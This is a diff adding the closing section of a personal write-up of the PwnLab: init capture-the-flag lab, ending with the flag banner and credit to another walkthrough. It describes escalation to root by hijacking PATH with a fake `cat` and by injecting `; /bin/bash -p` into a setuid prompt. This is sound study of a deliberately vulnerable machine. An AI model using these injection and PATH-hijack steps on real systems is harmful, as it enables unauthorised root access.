@@ -210,3 +210,41 @@ Going back to the mysql out from before, I tested their passwords. It worked for
 The machine didn't seem to run sudo, just su, so I couldn't do a `sudo -l` as I normally would.
 
 kane had a file called ./msgmike in his home directory, that ran as mike. Running it resulted in the following error: `cat: /home/mike/msg.txt: No such file or directory`
+
+## Final Tricks and Flag
+
+I got more hints here. Overall, while I learned a lot with this lab, I don't feel like I really solved it myself.
+
+Basically:
+
+- By putting a new command into a local file called `cat`, e.g. `echo /bin/bash > ./cat`, with `chmod 777 ./cat` and `export PATH=:./:$PATH`, when ./msgmike is run I end up with a mike shell.
+- Mike has a `msg2root` command in his home dir, which when run prompts for input.
+- The input is injectable: providing `; /bin/bash -p` I end up with a root shell, where I can then get the flag:
+
+```
+.-=~=-.                                                                 .-=~=-.
+(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+(_ ___)  _____                             _                            (_ ___)
+(__  _) /  __ \                           | |                           (__  _)
+( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+( _ __)                     __/ |                                       ( _ __)
+(__  _)                    |___/                                        (__  _)
+(__  _)                                                                 (__  _)
+(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+(__  _) this challenge.                                                 (__  _)
+(_ ___)                                                                 (_ ___)
+( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+(__  _) reading it                                                      (__  _)
+(__  _)                                                                 (__  _)
+(__  _)                                             For sniferl4bs.com  (__  _)
+( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+(__  _)                                                                 (__  _)
+(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+`-._.-'                                                                 `-._.-'
+```
+
+I learned a lot from this one, and spent a lot of time on it, but credit for the hints that got me through its should go to [https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-pwnlab-init/](https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-pwnlab-init/)
